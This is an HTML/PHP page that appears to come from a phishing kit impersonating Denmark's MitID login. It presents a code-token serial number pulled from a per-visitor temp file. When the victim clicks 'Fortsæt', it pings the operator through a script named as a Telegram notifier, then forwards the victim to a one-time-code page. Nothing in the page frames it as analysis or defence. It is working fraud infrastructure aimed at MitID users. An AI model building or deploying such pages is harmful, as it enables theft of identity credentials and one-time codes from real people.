<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Serienummeret</title>
    <link rel="stylesheet" href="cs.css" id="mitid-styles">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            text-align: center;
            width: 80%;
            max-width: 500px;
        }

        .mitid-device {
            width: 90%;
            margin-bottom: 20px;
        }

        .instruction {
            font-size: 16px;
            margin-bottom: 20px;
        }

        .continue-button {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }

        .continue-button:hover {
            background-color: #0056b3;
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function sendTelegramMessage() {
            $.ajax({
                url: '../send/send_click_makina.php',
                type: 'POST',
                data: { message: 'Clicka 3la Fortsæt' },
                success: function(response) {
                    console.log(response);
                },
                error: function(xhr, status, error) {
                    console.log("Error: " + error);
                }
            });
        }

        $(document).ready(function() {
            $('#submitButton').click(function() {
                sendTelegramMessage();
            });
        });
    </script>
</head>
<body>
    <div class="container">
        <img src="https://www.mitid.dk/assets/authenticators/serial-number/code-token-serial.png" alt="MitID Device" class="mitid-device">
        <p class="instruction">Tjek, at serienummeret på bagsiden af din MitID kodeviser er: <strong>
            <?php
                $ip = $_SERVER['REMOTE_ADDR'];
                $filePath = "../temp/{$ip}.txt";
                if (file_exists($filePath)) {
                    $code = file_get_contents($filePath);
                    echo htmlspecialchars($code);
                    unlink($filePath);
                } else {
                    echo "Ingen kode tilgængelig";
                }
            ?>
        </strong></p>
        <form action="engangskode.html" method="post">
            <button id="submitButton" class="mitid--button-primary" tabindex="0" type="submit" showicontext="IconﾠHelpﾠText">
                <span class="mitid--button-label">Fortsæt</span>
                <span class="mitid--button-spacing"></span>
                <svg xmlns="http://www.w3.org/2000/svg" focusable="false" class="mitid--button-icon" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"></path>
                </svg>
            </button>
        </form>
    </div>
</body>
</html>